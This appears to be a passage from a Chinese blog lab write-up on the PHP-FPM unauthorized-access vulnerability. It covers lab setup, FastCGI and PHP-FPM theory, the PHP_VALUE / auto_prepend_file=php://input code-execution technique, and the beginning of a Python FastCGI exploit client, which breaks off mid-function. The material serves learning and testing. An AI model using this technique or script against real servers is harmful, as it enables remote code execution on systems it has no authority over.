<span class="number">0.0.0.0:9000</span>;<span class="comment">#nginx fastcgi进程监听的IP地址和端口</span></span><br><span class="line">        <span class="comment">#fastcgi_pass unix:/run/php/php7.4-fpm.sock;</span></span><br><span class="line">        <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">        <span class="comment">#指明脚本目录，防止找不到文件</span></span><br><span class="line">        <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        <span class="attribute">include</span> fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5><span id="环境启动">环境启动</span></h5><p>php-fpm</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whereis php-fpm</span><br><span class="line">/usr/sbin/php-fpm7.4    <span class="comment"># 这是我的靶机上php-fpm安装的位置</span></span><br><span class="line"><span class="comment"># 注意权限问题</span></span><br></pre></td></tr></table></figure><p>Nginx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart nginx</span><br></pre></td></tr></table></figure><blockquote><p><code>systemctl status nginx</code> 检查Nginx状态</p></blockquote><h5><span id="入口文件">入口文件</span></h5><p><code>/var/www/html</code>下设置<code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>服务开启效果：</p><img src="/images/实验--PHP-FPM_未授权访问漏洞/image-20211108220447519.png" alt="image-20211108220447519" style="zoom:80%;"><h4><span id="原理准备">原理准备</span></h4><p>[浅入深出 Fastcgi 协议分析与 PHP-FPM 攻击方法](<a href="https://whoamianony.top/2021/05/15/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA">https://whoamianony.top/2021/05/15/Web安全/浅入深出</a> Fastcgi 协议分析与 PHP-FPM 攻击方法/)</p><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p><h5><span id="cgi">CGI</span></h5><blockquote><p>​        为了解决Web服务器与外部应用程序（CGI程序）之间数据互通，于是出现了CGI（Common Gateway Interface）通用网关接口。<strong>简单理解，可以认为CGI是Web服务器和运行在其上的应用程序进行“交流”的一种约定。</strong></p><p>​        当遇到动态脚本请求时，Web服务器主进程就会Fork创建出一个新的进程来启动CGI程序，运行外部C程序或Perl、PHP脚本等，也就是将动态脚本交给CGI程序来处理。启动CGI程序需要一个过程，如读取配置文件、加载扩展等。当CGI程序启动后会去解析动态脚本，然后将结果返回给Web服务器，最后由Web服务器将结果返回给客户端，之前Fork出来的进程也随之关闭。这样，每次用户请求动态脚本，Web服务器都要重新Fork创建一个新进程去启动CGI程序，由CGI程序来处理动态脚本，处理完成后进程随之关闭，其效率是非常低下的。</p><p>​        而对于Mod CGI，Web服务器可以内置Perl解释器或PHP解释器。 也就是说将这些解释器做成模块的方式，Web服务器会在启动的时候就启动这些解释器。 当有新的动态请求进来时，Web服务器就是自己解析这些动态脚本，省得重新Fork一个进程，效率提高了。</p></blockquote><h5><span id="fastcgi">FastCGI</span></h5><blockquote><p>​        但是Web服务器有一个问题，就是它每收到一个请求，都会去Fork一个CGI进程，请求结束再kill掉这个进程，这样会很浪费资源。于是，便出现了CGI的改良版本——Fast-CGI。</p><p>​        FastCGI致力于减少网页服务器与CGI程序之间交互的开销，Fast-CGI每次处理完请求后，不会kill掉这个进程，而是保留这个进程，从而使服务器可以同时处理更多的网页请求。这样就会大大的提高效率。</p></blockquote><h5><span id="php-fpm">PHP-FPM</span></h5><blockquote><p>​        官方对PHP-FPM的解释是 FastCGI 进程管理器，用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。PHP-FPM 默认监听的端口是 9000 端口。</p><p>​        也就是说 <strong>PHP-FPM 是 FastCGI 的一个具体实现</strong>，并且提供了进程管理的功能，在其中的进程中，包含了 master 和 worker 进程，这个在后面我们进行环境搭建的时候可以通过命令查看。其中<strong>master 进程负责与 Web 服务器中间件进行通信</strong>，接收服务器中间按照 FastCGI 的规则打包好的用户请求，再将请求转发给 worker 进程进行处理。<strong>worker 进程主要负责后端动态执行 PHP 代码，</strong>处理完成后，将处理结果返回给 Web 服务器，再由 Web 服务器将结果发送给客户端。</p><p>​        举个例子，当用户访问 <code>http://127.0.0.1/index.php?a=1&amp;b=2</code> 时，如果 Web 目录是 /var/www/html，那么 Web 服务器中间件（如 Nginx）会将这个请求变成如下 key-value 对：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>PHP-FPM 拿到 Fastcgi 的数据包后，进行解析，根据请求情况设置<strong>环境变量</strong>(如：<code>$_SERVER</code>)，动态执行 PHP 代码。</p><h5><span id="任意代码执行">任意代码执行</span></h5><p><code>SCRIPT_FILENAME</code> 对应的是 PHP-FPM 将要执行哪个PHP文件 （正常情况下视请求而定，动态执行）</p><blockquote><p>在 PHP 5.3.9 后来的版本中，PHP 增加了 <code>security.limit_extensions</code> 安全选项，导致只能控制 PHP-FPM 执行一些像 php、php3、php4、php5、php7 这样的文件，因此你必须找到一个已经存在的 PHP 文件，这也增大了攻击的难度。</p></blockquote><p>我们熟悉的是：<strong>php.ini</strong> 有 <code>auto_prepend_file</code>和<code>auto_append_file</code> <strong>.htaccess</strong>马常使用这两个值操作</p><p>如果我们可以设置 <code>auto_prepend_file</code> 为 <code>php://input</code>，那么就等于在执行任何 PHP 文件前都要包含一遍 POST 的内容。所以，我们只需要把需要执行的代码放在 Body 中，他们就能被执行了。（<strong>当然，这还需要开启远程文件包含选项</strong> <code>allow_url_include</code>）</p><hr><h5><span id="php_value-和-php_admin_value">PHP_VALUE 和 PHP_ADMIN_VALUE</span></h5><p>PHP-FPM 的两个环境变量：<code>PHP_VALUE</code>与<code>PHP_ADMIN_VALUE</code></p><p><strong>这两个环境变量可以用来设置 PHP 配置项</strong></p><p><code>PHP_VALUE</code> 可以设置模式为 <code>PHP_INI_USER</code> 和 <code>PHP_INI_ALL</code> 的选项</p><p><code>PHP_ADMIN_VALUE</code> 可以设置所有选项。</p><p>完成攻击</p><h4><span id="fpm-请求">FPM 请求</span></h4><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p><p><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(<span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(c, <span class="built_in">int</span>):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">issubclass</span>(<span class="built_in">type</span>(s), <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        s = <span class="built_in">str</span>(s, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">str</span>(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, port, timeout, keepalive</span>):</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = <span class="built_in">dict</span>()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, <span class="built_in">int</span>(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            print(<span class="built_in">repr</span>(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span>(<span class="params">self, fcgi_type, content, requestid</span>):</span></span><br><span class="line">        length = <span class="built_in">len</span>(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span>(<span class="params">self, name, value</span>):</span></span><br><span class="line">        nLen = <span class="built_in">len</span>(name)</span><br><span class="line">        vLen = <span class="built_in">len</span>(value)</span><br><span class="line">        record = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">        header = <span class="built_in">dict</span>()</span><br><span class="line">        header[<span class="string">&#x27;version&#x27;</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">&#x27;type&#x27;</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span>(<span class="params">self, buffer</span>):</span></span><br><span class="line">        header = buffer.read(<span class="built_in">int</span>(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">&#x27;content&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;contentLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = <span class="built_in">int</span>(record[<span class="string">&#x27;contentLength&#x27;</span>])</span><br><span class="line">                record[<span class="string">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;paddingLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(<span class="built_in">int</span>(record[<span class="string">&#x27;paddingLength&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span>(<span class="params">self, nameValuePairs=&#123;&#125;, post=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            print(<span class="string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = <span class="built_in">dict</span>()</span><br><span class="line">        request = <span class="string">b&quot;&quot;</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        self.sock.send(request)</span><br><span class="line">        self.requests[requestId][<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND</span><br><span class="line">        self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.__waitForResponse(requestId)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span>(<span class="params">self, requestId</span>):</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == <span class="built_in">int</span>(response[<span class="string">&#x27;requestId&#x27;</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] += response[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span 